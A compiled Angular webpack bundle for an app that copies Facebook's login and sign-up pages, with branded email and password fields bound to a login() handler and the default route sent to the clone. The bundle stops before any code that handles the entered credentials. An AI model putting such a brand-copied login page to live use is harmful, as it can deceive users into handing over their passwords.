(window["webpackJsonp"] = window["webpackJsonp"] || []).push([["main"],{

/***/ "./$$_lazy_route_resource lazy recursive":
/*!******************************************************!*\
  !*** ./$$_lazy_route_resource lazy namespace object ***!
  \******************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

function webpackEmptyAsyncContext(req) {
	// Here Promise.resolve().then() is used instead of new Promise() to prevent
	// uncaught exception popping up in devtools
	return Promise.resolve().then(function() {
		var e = new Error("Cannot find module '" + req + "'");
		e.code = 'MODULE_NOT_FOUND';
		throw e;
	});
}
webpackEmptyAsyncContext.keys = function() { return []; };
webpackEmptyAsyncContext.resolve = webpackEmptyAsyncContext;
module.exports = webpackEmptyAsyncContext;
webpackEmptyAsyncContext.id = "./$$_lazy_route_resource lazy recursive";

/***/ }),

/***/ "./node_modules/raw-loader/index.js!./src/app/app.component.html":
/*!**************************************************************!*\
  !*** ./node_modules/raw-loader!./src/app/app.component.html ***!
  \**************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<router-outlet></router-outlet>\n"

/***/ }),

/***/ "./node_modules/raw-loader/index.js!./src/app/clone/clone.component.html":
/*!**********************************************************************!*\
  !*** ./node_modules/raw-loader!./src/app/clone/clone.component.html ***!
  \**********************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<nav class=\"uk-navbar-container uk-box-shadow-small boundary uk-visible@m\">\r\n    <div class=\"uk-container uk-container-large uk-padding-large uk-padding-remove-top uk-padding-remove-bottom\" data-uk-navbar>\r\n        <div class=\"uk-navbar-left\">\r\n            <h1 class=\"uk-margin-xlarge-left\">facebook</h1>\r\n        </div>\r\n        <div class=\"uk-navbar-right\">\r\n            <div class=\"uk-navbar-item\">\r\n                <div class=\"uk-grid uk-grid-small uk-margin-xlarge-right\" data-uk-grid>\r\n                    <div class=\"uk-width-auto\">\r\n                        <label class=\"uk-form-label row1\" for=\"\">Email or Phone</label><br>\r\n                        <input [(ngModel)]=\"user.email\" name=\"email\" type=\"text\" class=\"inputtext\"><br>\r\n                        <span class=\"row2\"><input type=\"checkbox\" checked>Keep me logged in</span>\r\n                        \r\n                    </div>\r\n                    <div class=\"uk-width-auto\">\r\n                        <label class=\"uk-form-label row1\" for=\"\">Password</label><br>\r\n                        <input [(ngModel)]=\"user.password\" name=\"password\" type=\"password\" class=\"inputtext\"><br>\r\n                        <span class=\"row2 h\">Forgot your password?</span>\r\n                    </div>\r\n                    <div class=\"uk-width-expand\">\r\n                        <label class=\"uk-form-label row1\" for=\"\"></label><br>\r\n                        <button (click)=\"login()\" id=\"button\">Log In</button>\r\n                    </div>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</nav>\r\n<nav class=\"uk-navbar-container uk-box-shadow-small boundary uk-hidden@m\">\r\n    <div class=\"uk-container uk-container-large\">\r\n        <div class=\"uk-navbar\" uk-navbar=\"mode:click;\">\r\n            <div class=\"uk-navbar-left\">\r\n                <h1 class=\"uk-margin-small-left\">facebook</h1>\r\n            </div>\r\n            <div class=\"uk-navbar-right\">\r\n                <a class=\"uk-navbar-toggle\" uk-navbar-toggle-icon uk-toggle=\"target: #side-nav\"></a>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</nav>\r\n\r\n<div id=\"side-nav\" data-uk-offcanvas=\"  overlay: true\">\r\n    <div class=\"uk-offcanvas-bar\">\r\n            <ul class=\"uk-nav-default uk-nav-parent-icon uk-margin-auto-vertical\" uk-nav=\"multiple: true\">\r\n  \r\n                <li>\r\n                    <div class=\"uk-width-1-1\">\r\n                        <label class=\"uk-form-label row1\" for=\"\">Email or Phone</label><br>\r\n                        <input [(ngModel)]=\"user.email\" name=\"email\" type=\"text\" class=\"inputtext\"><br>\r\n                        <span class=\"row2\"><input type=\"checkbox\" checked>Keep me logged in</span>\r\n                        \r\n                    </div>\r\n                </li>\r\n                <li>\r\n                    <div class=\"uk-width-1-1\">\r\n                        <label class=\"uk-form-label row1\" for=\"\">Password</label><br>\r\n                        <input [(ngModel)]=\"user.password\" name=\"password\" type=\"password\" class=\"inputtext\"><br>\r\n                        <span class=\"row2 h\">Forgot your password?</span>\r\n                    </div>\r\n                </li>\r\n                <li>\r\n                    <div class=\"uk-width-1-1 uk-margin-small-top\">\r\n                        <button (click)=\"login()\" id=\"button\">Log In</button>\r\n                    </div>\r\n                </li>\r\n                <li class=\"uk-nav-divider uk-margin-small-top\" style=\"color: white\">\r\n                </li>\r\n    \r\n            </ul>\r\n    </div>\r\n</div>\r\n\r\n\r\n<div class=\"uk-section uk-padding-small uk-padding-remove-top\" data-uk-height-viewport>\r\n    <div class=\"uk-container body-container\" data-uk-toggle=\"cls: uk-padding-large; mode: media; media: @m;\">\r\n        <div class=\"uk-grid uk-grid-small uk-margin-small\" data-uk-grid>\r\n            <div class=\"uk-width-1-2@s\">\r\n                <div class=\"uk-container uk-padding-large uk-padding-remove-top\" data-uk-toggle=\"cls: uk-margin-large-left; mode: media; media: @m;\">\r\n                    <div class=\"connect bolder\">\r\n                    Facebook helps you connect and share with the people in your life.</div>\r\n                    <div >\r\n                    <img src=\"https://s3.ap-south-1.amazonaws.com/karan.garg/OBaVg52wtTZ.png\"\r\n                        alt=\"\"  />\r\n                    </div>\r\n                </div>\r\n            </div>\r\n            <div class=\"uk-width-1-2@s\">\r\n                <div class=\"uk-container uk-padding-large uk-padding-remove-top\">\r\n                        <div class=\"uk-grid uk-grid-small uk-padding-remove-top\" data-uk-grid data-uk-toggle=\"cls: uk-padding-large; mode: media; media: @m\">\r\n                                <div class=\"uk-width-1-1\">\r\n                                    <h6 class=\" signup bolder\">Sign Up</h6>\r\n                                    <h6 class=\"uk-margin-remove-top free bolder\">It's free and always will be</h6>\r\n                                </div>\r\n                                <div class=\"uk-width-1-1 uk-margin-remove\">\r\n                                    <div class=\"uk-grid-small uk-grid\" data-uk-grid>\r\n                                        <div class=\"uk-width-1-2@s uk-margin-remove-bottom\">\r\n                                                <input [(ngModel)]=\"new_user.first_name\" name=\"first_name\" type=\"text\" class=\"inputbody in1 uk-input\" placeholder=\"First name\">\r\n                                        </div>\r\n                                        <div class=\"uk-width-1-2@s uk-margin-remove-top\">\r\n                                                <input [(ngModel)]=\"new_user.last_name\" name=\"last_name\" type=\"text\" class=\"inputbody in1 fr uk-input\" placeholder=\"Last name\">\r\n                                        </div>\r\n                                    </div>\r\n                                </div>\r\n                                <div class=\"uk-width-1-1 uk-margin-remove\">\r\n                                        <input [(ngModel)]=\"new_user.email\" name=\"email\" type=\"text\" class=\"inputbody in2 uk-input\" placeholder=\"Email or mobile number\">\r\n                                </div>\r\n                                <div class=\"uk-width-1-1 uk-margin-remove\">\r\n                                        <input [(ngModel)]=\"new_user.email\" name=\"email\" type=\"text\" class=\"inputbody in2 uk-input\" placeholder=\"Re-enter email or mobile number\">\r\n                                </div>\r\n                                <div class=\"uk-width-1-1 uk-margin-remove\">\r\n                                        <input [(ngModel)]=\"new_user.password\" name=\"password\" type=\"text\" class=\"inputbody in2 uk-input\" placeholder=\"New password\">\r\n                                </div>\r\n                                <div class=\"uk-width-1-1 uk-margin-remove\">\r\n                                    <label class=\"uk-form-label bday\" for=\"\">Birthday</label>\r\n                                    <div class=\"uk-grid uk-grid-small uk-margin-small-top\" data-uk-grid>\r\n                                        <div class=\"uk-width-auto\">\r\n                                                <select  name=\"birthday_day\" title=\"Day\" class=\"selectbody fl uk-select\">\r\n                                                        <option value=\"0\" selected=\"1\">Day</option>\r\n                                                        <option value=\"1\">1</option>\r\n                                                        <option value=\"2\">2</option>\r\n                                                        <option value=\"3\">3</option>\r\n                                                        <option value=\"4\">4</option>\r\n                                                        <option value=\"5\">5</option>\r\n                                                        <option value=\"6\">6</option>\r\n                                                        <option value=\"7\">7</option>\r\n                                                        <option value=\"8\">8</option>\r\n                                                        <option value=\"9\">9</option>\r\n                                                        <option value=\"10\">10</option>\r\n                                                        <option value=\"11\">11</option>\r\n                                                        <option value=\"12\">12</option>\r\n                                                        <option value=\"13\">13</option>\r\n                                                        <option value=\"14\">14</option>\r\n                                                        <option value=\"15\">15</option>\r\n                                                        <option value=\"16\">16</option>\r\n                                                        <option value=\"17\">17</option>\r\n                                                        <option value=\"18\">18</option>\r\n                                                        <option value=\"19\">19</option>\r\n                                                        <option value=\"20\">20</option>\r\n                                                        <option value=\"21\">21</option>\r\n                                                        <option value=\"22\">22</option>\r\n                                                        <option value=\"23\">23</option>\r\n                                                        <option value=\"24\">24</option>\r\n                                                        <option value=\"25\">25</option>\r\n                                                        <option value=\"26\">26</option>\r\n                                                        <option value=\"27\">27</option>\r\n                                                        <option value=\"28\">28</option>\r\n                                                        <option value=\"29\">29</option>\r\n                                                        <option value=\"30\">30</option>\r\n                                                        <option value=\"31\">31</option>\r\n                                                        </select>\r\n                                        </div>\r\n                                        <div class=\"uk-width-auto uk-padding-remove-left\">\r\n                                                <select  name=\"birthday_month\" title=\"Month\" class=\"selectbody uk-select\">\r\n                                                        <option value=\"0\" selected=\"1\">Month</option>\r\n                                                        <option value=\"1\">Jan</option>\r\n                                                        <option value=\"2\">Feb</option>\r\n                                                        <option value=\"3\">Mar</option>\r\n                                                        <option value=\"4\">Apr</option>\r\n                                                        <option value=\"5\">May</option>\r\n                                                        <option value=\"6\">Jun</option>\r\n                                                        <option value=\"7\">Jul</option>\r\n                                                        <option value=\"8\">Aug</option>\r\n                                                        <option value=\"9\">Sep</option>\r\n                                                        <option value=\"10\">Oct</option>\r\n                                                        <option value=\"11\">Nov</option>\r\n                                                        <option value=\"12\">Dec</option>\r\n                                                </select>\r\n                                        </div>\r\n                                        <div class=\"uk-width-auto uk-padding-remove-left\">\r\n                                                <select  name=\"birthday_year\" title=\"Year\" class=\"selectbody fl uk-select\">\r\n                                                        <option value=\"0\" selected=\"1\">Year</option>\r\n                                                        <option value=\"2015\">2015</option>\r\n                                                        <option value=\"2014\">2014</option>\r\n                                                        <option value=\"2013\">2013</option>\r\n                                                        <option value=\"2012\">2012</option>\r\n                                                        <option value=\"2011\">2011</option>\r\n                                                        <option value=\"2010\">2010</option>\r\n                                                        <option value=\"2009\">2009</option>\r\n                                                        <option value=\"2008\">2008</option>\r\n                                                        <option value=\"2007\">2007</option>\r\n                                                        <option value=\"2006\">2006</option>\r\n                                                        <option value=\"2005\">2005</option>\r\n                                                        <option value=\"2004\">2004</option>\r\n                                                        <option value=\"2003\">2003</option>\r\n                                                        <option value=\"2002\">2002</option>\r\n                                                        <option value=\"2001\">2001</option>\r\n                                                        <option value=\"2000\">2000</option>\r\n                                                        <option value=\"1999\">1999</option>\r\n                                                        <option value=\"1998\">1998</option>\r\n                                                        <option value=\"1997\">1997</option>\r\n                                                        <option value=\"1996\">1996</option>\r\n                                                        <option value=\"1995\">1995</option>\r\n                                                        <option value=\"1994\">1994</option>\r\n                                                        <option value=\"1993\">1993</option>\r\n                                                        <option value=\"1992\">1992</option>\r\n                                                        <option value=\"1991\">1991</option>\r\n                                                        <option value=\"1990\">1990</option>\r\n                                                        <option value=\"1989\">1989</option>\r\n                                                        <option value=\"1988\">1988</option>\r\n                                                        <option value=\"1987\">1987</option>\r\n                                                        <option value=\"1986\">1986</option>\r\n                                                        <option value=\"1985\">1985</option>\r\n                                                        <option value=\"1984\">1984</option>\r\n                                                        <option value=\"1983\">1983</option>\r\n                                                        <option value=\"1982\">1982</option>\r\n                                                        <option value=\"1981\">1981</option>\r\n                                                        <option value=\"1980\">1980</option>\r\n                                                        <option value=\"1979\">1979</option>\r\n                                                        <option value=\"1978\">1978</option>\r\n                                                        <option value=\"1977\">1977</option>\r\n                                                        <option value=\"1976\">1976</option>\r\n                                                        <option value=\"1975\">1975</option>\r\n                                                        <option value=\"1974\">1974</option>\r\n                                                        <option value=\"1973\">1973</option>\r\n                                                        <option value=\"1972\">1972</option>\r\n                                                        <option value=\"1971\">1971</option>\r\n                                                        <option value=\"1970\">1970</option>\r\n                                                        <option value=\"1969\">1969</option>\r\n                                                        <option value=\"1968\">1968</option>\r\n                                                        <option value=\"1967\">1967</option>\r\n                                                        <option value=\"1966\">1966</option>\r\n                                                        <option value=\"1965\">1965</option>\r\n                                                        <option value=\"1964\">1964</option>\r\n                                                        <option value=\"1963\">1963</option>\r\n                                                        <option value=\"1962\">1962</option>\r\n                                                        <option value=\"1961\">1961</option>\r\n                                                        <option value=\"1960\">1960</option>\r\n                                                        <option value=\"1959\">1959</option>\r\n                                                        <option value=\"1958\">1958</option>\r\n                                                        <option value=\"1957\">1957</option>\r\n                                                        <option value=\"1956\">1956</option>\r\n                                                        <option value=\"1955\">1955</option>\r\n                                                        <option value=\"1954\">1954</option>\r\n                                                        <option value=\"1953\">1953</option>\r\n                                                        <option value=\"1952\">1952</option>\r\n                                                        <option value=\"1951\">1951</option>\r\n                                                        <option value=\"1950\">1950</option>\r\n                                                        <option value=\"1949\">1949</option>\r\n                                                        <option value=\"1948\">1948</option>\r\n                                                        <option value=\"1947\">1947</option>\r\n                                                        <option value=\"1946\">1946</option>\r\n                                                        <option value=\"1945\">1945</option>\r\n                                                        <option value=\"1944\">1944</option>\r\n                                                        <option value=\"1943\">1943</option>\r\n                                                        <option value=\"1942\">1942</option>\r\n                                                        <option value=\"1941\">1941</option>\r\n                                                        <option value=\"1940\">1940</option>\r\n                                                        <option value=\"1939\">1939</option>\r\n                                                        <option value=\"1938\">1938</option>\r\n                                                        <option value=\"1937\">1937</option>\r\n                                                        <option value=\"1936\">1936</option>\r\n                                                        <option value=\"1935\">1935</option>\r\n                                                        <option value=\"1934\">1934</option>\r\n                                                        <option value=\"1933\">1933</option>\r\n                                                        <option value=\"1932\">1932</option>\r\n                                                        <option value=\"1931\">1931</option>\r\n                                                        <option value=\"1930\">1930</option>\r\n                                                        <option value=\"1929\">1929</option>\r\n                                                        <option value=\"1928\">1928</option>\r\n                                                        <option value=\"1927\">1927</option>\r\n                                                        <option value=\"1926\">1926</option>\r\n                                                        <option value=\"1925\">1925</option>\r\n                                                        <option value=\"1924\">1924</option>\r\n                                                        <option value=\"1923\">1923</option>\r\n                                                        <option value=\"1922\">1922</option>\r\n                                                        <option value=\"1921\">1921</option>\r\n                                                        <option value=\"1920\">1920</option>\r\n                                                        <option value=\"1919\">1919</option>\r\n                                                        <option value=\"1918\">1918</option>\r\n                                                        <option value=\"1917\">1917</option>\r\n                                                        <option value=\"1916\">1916</option>\r\n                                                        <option value=\"1915\">1915</option>\r\n                                                        <option value=\"1914\">1914</option>\r\n                                                        <option value=\"1913\">1913</option>\r\n                                                        <option value=\"1912\">1912</option>\r\n                                                        <option value=\"1911\">1911</option>\r\n                                                        <option value=\"1910\">1910</option>\r\n                                                        <option value=\"1909\">1909</option>\r\n                                                        <option value=\"1908\">1908</option>\r\n                                                        <option value=\"1907\">1907</option>\r\n                                                        <option value=\"1906\">1906</option>\r\n                                                        <option value=\"1905\">1905</option>\r\n                                                        </select>\r\n                                        </div>\r\n                                        <div class=\"uk-width-expand@s uk-width-1-1\">\r\n                                            <p class=\"fb1 why h\">Why do I need to provide my birthday?</p>\r\n                                        </div>\r\n                                    </div>\r\n                                </div>\r\n                                <div class=\"uk-width-1-1\">\r\n                                        <input [(ngModel)]=\"new_user.gender\" name=\"gender\" value=\"female\" type=\"radio\" id=\"fem\" class=\"m0\">\r\n                                        <label for=\"fem\" class=\"gender\">Female\r\n                                        </label>\r\n                                        <input [(ngModel)]=\"new_user.gender\" name=\"gender\" value=\"male\" type=\"radio\" id=\"male\" class=\"m0 uk-margin-small-right\">\r\n                                        <label for=\"male\" class=\"gender\">Male\r\n                                        </label>\r\n                                </div>\r\n                                <div class=\"uk-width-1-1\">\r\n                                    <p class=\"agree\">By clicking Sign Up, you agree to our <span class=\"link\">Terms</span> and that you have read our <span class=\"link\">Data Use Policy</span>, including our <span class=\"link\">Cookie Use.</span></p>\r\n                                </div>\r\n                                <div class=\"uk-width-1-1\">\r\n                                    <button type=\"button\" (click)=\"newUser()\" class=\"signbut bolder\">Sign Up</button>\r\n                                </div>\r\n                                <div class=\"uk-width-1-1 create\">\r\n                                    <p class=\"uk-margin-small-top\"><span class=\"link h\">Create a Page</span> for a celebrity, band or business</p>\r\n                                </div>\r\n                            </div> \r\n                </div>\r\n              </div>\r\n        </div>\r\n    </div>\r\n</div>"

/***/ }),

/***/ "./node_modules/raw-loader/index.js!./src/app/facebook/facebook.component.html":
/*!****************************************************************************!*\
  !*** ./node_modules/raw-loader!./src/app/facebook/facebook.component.html ***!
  \****************************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div id=\"navwrapper\" class=\"uk-visible@m\">\r\n  <div id=\"navbar\">\r\n    <table class=\"tablewrapper\">\r\n      <tr>\r\n        <td class=\"row1\">Email or Phone</td>\r\n        <td class=\"row1\">Password</td>\r\n      </tr>\r\n      <tr>\r\n        <td><input [(ngModel)]=\"user.email\" name=\"email\" type=\"text\" class=\"inputtext\">\r\n        </td>\r\n        <td><input [(ngModel)]=\"user.password\" name=\"password\" type=\"password\" class=\"inputtext\">\r\n        </td>\r\n        <td>\r\n          <div (click)=\"login()\" id=\"button\">Log In</div>\r\n        </td>\r\n      </tr>\r\n      <tr>\r\n        <td>\r\n          <div class=\"row2\"><input type=\"checkbox\" checked>Keep me logged in</div>\r\n        </td>\r\n        <td class=\"row2 h\">Forgot your password?</td>\r\n      </tr>\r\n    </table>\r\n    <h1 class=\"logowrapper\">facebook</h1>\r\n  </div>\r\n</div>\r\n\r\n<div id=\"contentwrapper\">\r\n  <div id=\"content\">\r\n    <div id=\"leftbod\">\r\n      <div class=\"connect bolder\">\r\n        Facebook helps you connect and share with the people in your life.</div>\r\n      <div >\r\n        <img src=\"https://s3.ap-south-1.amazonaws.com/karan.garg/OBaVg52wtTZ.png\"\r\n          alt=\"\"  />\r\n      </div>\r\n    </div>\r\n    <div id=\"rightbod\">\r\n      <div class=\"signup bolder\">Sign Up</div>\r\n      <div class=\"free bolder\">It's free and always will be</div>\r\n\r\n      <div class=\"formbox\">\r\n        <input [(ngModel)]=\"new_user.first_name\" name=\"first_name\" type=\"text\" class=\"inputbody in1\" placeholder=\"First name\">\r\n        <input [(ngModel)]=\"new_user.last_name\" name=\"last_name\" type=\"text\" class=\"inputbody in1 fr\" placeholder=\"Last name\">\r\n      </div>\r\n      <div class=\"formbox\">\r\n        <input [(ngModel)]=\"new_user.email\" name=\"email\" type=\"text\" class=\"inputbody in2\" placeholder=\"Email or mobile number\">\r\n      </div>\r\n      <div class=\"formbox\">\r\n        <input [(ngModel)]=\"new_user.email\" name=\"email\" type=\"text\" class=\"inputbody in2\" placeholder=\"Re-enter email or mobile number\">\r\n      </div>\r\n      <div class=\"formbox\">\r\n        <input [(ngModel)]=\"new_user.password\" name=\"password\" type=\"text\" class=\"inputbody in2\" placeholder=\"New password\">\r\n      </div>\r\n      <div class=\"formbox\">\r\n        <div class=\"bday\">Birthday</div>\r\n      </div>\r\n      <div class=\"formbox\">\r\n        <span data-type=\"selectors\">\r\n          <span>\r\n            <select  name=\"birthday_month\" title=\"Month\" class=\"selectbody\">\r\n              <option value=\"0\" selected=\"1\">Month</option>\r\n              <option value=\"1\">Jan</option>\r\n              <option value=\"2\">Feb</option>\r\n              <option value=\"3\">Mar</option>\r\n              <option value=\"4\">Apr</option>\r\n              <option value=\"5\">May</option>\r\n              <option value=\"6\">Jun</option>\r\n              <option value=\"7\">Jul</option>\r\n              <option value=\"8\">Aug</option>\r\n              <option value=\"9\">Sep</option>\r\n              <option value=\"10\">Oct</option>\r\n              <option value=\"11\">Nov</option>\r\n              <option value=\"12\">Dec</option>\r\n            </select>\r\n            <select  name=\"birthday_day\" title=\"Day\" class=\"selectbody fl\">\r\n              <option value=\"0\" selected=\"1\">Day</option>\r\n              <option value=\"1\">1</option>\r\n              <option value=\"2\">2</option>\r\n              <option value=\"3\">3</option>\r\n              <option value=\"4\">4</option>\r\n              <option value=\"5\">5</option>\r\n              <option value=\"6\">6</option>\r\n              <option value=\"7\">7</option>\r\n              <option value=\"8\">8</option>\r\n              <option value=\"9\">9</option>\r\n              <option value=\"10\">10</option>\r\n              <option value=\"11\">11</option>\r\n              <option value=\"12\">12</option>\r\n              <option value=\"13\">13</option>\r\n              <option value=\"14\">14</option>\r\n              <option value=\"15\">15</option>\r\n              <option value=\"16\">16</option>\r\n              <option value=\"17\">17</option>\r\n              <option value=\"18\">18</option>\r\n              <option value=\"19\">19</option>\r\n              <option value=\"20\">20</option>\r\n              <option value=\"21\">21</option>\r\n              <option value=\"22\">22</option>\r\n              <option value=\"23\">23</option>\r\n              <option value=\"24\">24</option>\r\n              <option value=\"25\">25</option>\r\n              <option value=\"26\">26</option>\r\n              <option value=\"27\">27</option>\r\n              <option value=\"28\">28</option>\r\n              <option value=\"29\">29</option>\r\n              <option value=\"30\">30</option>\r\n              <option value=\"31\">31</option>\r\n            </select>\r\n            <select  name=\"birthday_year\" title=\"Year\" class=\"selectbody fl\">\r\n              <option value=\"0\" selected=\"1\">Year</option>\r\n              <option value=\"2015\">2015</option>\r\n              <option value=\"2014\">2014</option>\r\n              <option value=\"2013\">2013</option>\r\n              <option value=\"2012\">2012</option>\r\n              <option value=\"2011\">2011</option>\r\n              <option value=\"2010\">2010</option>\r\n              <option value=\"2009\">2009</option>\r\n              <option value=\"2008\">2008</option>\r\n              <option value=\"2007\">2007</option>\r\n              <option value=\"2006\">2006</option>\r\n              <option value=\"2005\">2005</option>\r\n              <option value=\"2004\">2004</option>\r\n              <option value=\"2003\">2003</option>\r\n              <option value=\"2002\">2002</option>\r\n              <option value=\"2001\">2001</option>\r\n              <option value=\"2000\">2000</option>\r\n              <option value=\"1999\">1999</option>\r\n              <option value=\"1998\">1998</option>\r\n              <option value=\"1997\">1997</option>\r\n              <option value=\"1996\">1996</option>\r\n              <option value=\"1995\">1995</option>\r\n              <option value=\"1994\">1994</option>\r\n              <option value=\"1993\">1993</option>\r\n              <option value=\"1992\">1992</option>\r\n              <option value=\"1991\">1991</option>\r\n              <option value=\"1990\">1990</option>\r\n              <option value=\"1989\">1989</option>\r\n              <option value=\"1988\">1988</option>\r\n              <option value=\"1987\">1987</option>\r\n              <option value=\"1986\">1986</option>\r\n              <option value=\"1985\">1985</option>\r\n              <option value=\"1984\">1984</option>\r\n              <option value=\"1983\">1983</option>\r\n              <option value=\"1982\">1982</option>\r\n              <option value=\"1981\">1981</option>\r\n              <option value=\"1980\">1980</option>\r\n              <option value=\"1979\">1979</option>\r\n              <option value=\"1978\">1978</option>\r\n              <option value=\"1977\">1977</option>\r\n              <option value=\"1976\">1976</option>\r\n              <option value=\"1975\">1975</option>\r\n              <option value=\"1974\">1974</option>\r\n              <option value=\"1973\">1973</option>\r\n              <option value=\"1972\">1972</option>\r\n              <option value=\"1971\">1971</option>\r\n              <option value=\"1970\">1970</option>\r\n              <option value=\"1969\">1969</option>\r\n              <option value=\"1968\">1968</option>\r\n              <option value=\"1967\">1967</option>\r\n              <option value=\"1966\">1966</option>\r\n              <option value=\"1965\">1965</option>\r\n              <option value=\"1964\">1964</option>\r\n              <option value=\"1963\">1963</option>\r\n              <option value=\"1962\">1962</option>\r\n              <option value=\"1961\">1961</option>\r\n              <option value=\"1960\">1960</option>\r\n              <option value=\"1959\">1959</option>\r\n              <option value=\"1958\">1958</option>\r\n              <option value=\"1957\">1957</option>\r\n              <option value=\"1956\">1956</option>\r\n              <option value=\"1955\">1955</option>\r\n              <option value=\"1954\">1954</option>\r\n              <option value=\"1953\">1953</option>\r\n              <option value=\"1952\">1952</option>\r\n              <option value=\"1951\">1951</option>\r\n              <option value=\"1950\">1950</option>\r\n              <option value=\"1949\">1949</option>\r\n              <option value=\"1948\">1948</option>\r\n              <option value=\"1947\">1947</option>\r\n              <option value=\"1946\">1946</option>\r\n              <option value=\"1945\">1945</option>\r\n              <option value=\"1944\">1944</option>\r\n              <option value=\"1943\">1943</option>\r\n              <option value=\"1942\">1942</option>\r\n              <option value=\"1941\">1941</option>\r\n              <option value=\"1940\">1940</option>\r\n              <option value=\"1939\">1939</option>\r\n              <option value=\"1938\">1938</option>\r\n              <option value=\"1937\">1937</option>\r\n              <option value=\"1936\">1936</option>\r\n              <option value=\"1935\">1935</option>\r\n              <option value=\"1934\">1934</option>\r\n              <option value=\"1933\">1933</option>\r\n              <option value=\"1932\">1932</option>\r\n              <option value=\"1931\">1931</option>\r\n              <option value=\"1930\">1930</option>\r\n              <option value=\"1929\">1929</option>\r\n              <option value=\"1928\">1928</option>\r\n              <option value=\"1927\">1927</option>\r\n              <option value=\"1926\">1926</option>\r\n              <option value=\"1925\">1925</option>\r\n              <option value=\"1924\">1924</option>\r\n              <option value=\"1923\">1923</option>\r\n              <option value=\"1922\">1922</option>\r\n              <option value=\"1921\">1921</option>\r\n              <option value=\"1920\">1920</option>\r\n              <option value=\"1919\">1919</option>\r\n              <option value=\"1918\">1918</option>\r\n              <option value=\"1917\">1917</option>\r\n              <option value=\"1916\">1916</option>\r\n              <option value=\"1915\">1915</option>\r\n              <option value=\"1914\">1914</option>\r\n              <option value=\"1913\">1913</option>\r\n              <option value=\"1912\">1912</option>\r\n              <option value=\"1911\">1911</option>\r\n              <option value=\"1910\">1910</option>\r\n              <option value=\"1909\">1909</option>\r\n              <option value=\"1908\">1908</option>\r\n              <option value=\"1907\">1907</option>\r\n              <option value=\"1906\">1906</option>\r\n              <option value=\"1905\">1905</option>\r\n            </select>\r\n          </span>\r\n        </span>\r\n        <div class=\"fb1 why h\">Why do I need to provide my birthday?</div>\r\n      </div>\r\n      <div class=\"formbox mt1\">\r\n        <span data-type=\"radio\" class=\"spanpad\">\r\n          <input [(ngModel)]=\"new_user.gender\" name=\"gender\" value=\"female\" type=\"radio\" id=\"fem\" class=\"m0\">\r\n          <label for=\"fem\" class=\"gender\">Female\r\n          </label>\r\n          <input [(ngModel)]=\"new_user.gender\" name=\"gender\" value=\"male\" type=\"radio\" id=\"male\" class=\"m0\">\r\n          <label for=\"male\" class=\"gender\">Male\r\n          </label>\r\n        </span>\r\n      </div>\r\n      <div class=\"formbox\">\r\n        <div class=\"agree\">\r\n          By clicking Sign Up, you agree to our <div class=\"link\">Terms</div> and that you have read our <div\r\n            class=\"link\">Data Use Policy</div>, including our <div class=\"link\">Cookie Use</div>.\r\n        </div>\r\n      </div>\r\n      <div class=\"formbox\">\r\n        <button type=\"button\" (click)=\"newUser()\" class=\"signbut bolder\">Sign Up</button>\r\n      </div>\r\n      <div class=\"formbox\">\r\n        <div class=\"create\">\r\n          <div class=\"link h\">Create a Page</div> for a celebrity, band or business.\r\n        </div>\r\n      </div>\r\n    </div>\r\n  </div>\r\n</div>"

/***/ }),

/***/ "./src/app/app-routing.module.ts":
/*!***************************************!*\
  !*** ./src/app/app-routing.module.ts ***!
  \***************************************/
/*! exports provided: AppRoutingModule, routingComponents */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AppRoutingModule", function() { return AppRoutingModule; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "routingComponents", function() { return routingComponents; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_router__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @angular/router */ "./node_modules/@angular/router/fesm5/router.js");
/* harmony import */ var _facebook_facebook_component__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./facebook/facebook.component */ "./src/app/facebook/facebook.component.ts");
/* harmony import */ var _clone_clone_component__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./clone/clone.component */ "./src/app/clone/clone.component.ts");





var routes = [
    { path: '', redirectTo: '/login', pathMatch: 'full' },
    { path: 'clone', component: _facebook_facebook_component__WEBPACK_IMPORTED_MODULE_3__["FacebookComponent"] },
    { path: 'login', component: _clone_clone_component__WEBPACK_IMPORTED_MODULE_4__["CloneComponent"] }
];
var AppRoutingModule = /** @class */ (function () {
    function AppRoutingModule() {
    }
    AppRoutingModule = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["NgModule"])({
            imports: [_angular_router__WEBPACK_IMPORTED_MODULE_2__["RouterModule"].forRoot(routes)],
            exports: [_angular_router__WEBPACK_IMPORTED_MODULE_2__["RouterModule"]]
        })
    ], AppRoutingModule);
    return AppRoutingModule;
}());

var routingComponents = [
    _facebook_facebook_component__WEBPACK_IMPORTED_MODULE_3__["FacebookComponent"],
    _clone_clone_component__WEBPACK_IMPORTED_MODULE_4__["CloneComponent"]
];


/***/ }),

/***/ "./src/app/app.component.css":
/*!***********************************!*\
  !*** ./src/app/app.component.css ***!
  \***********************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiJzcmMvYXBwL2FwcC5jb21wb25lbnQuY3NzIn0= */"

/***/ }),

/***/ "./src/app/app.component.ts":
/*!**********************************!*\
  !*** ./src/app/app.component.ts ***!
  \**********************************/
/*! exports provided: AppComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AppComponent", function() { return AppComponent; });
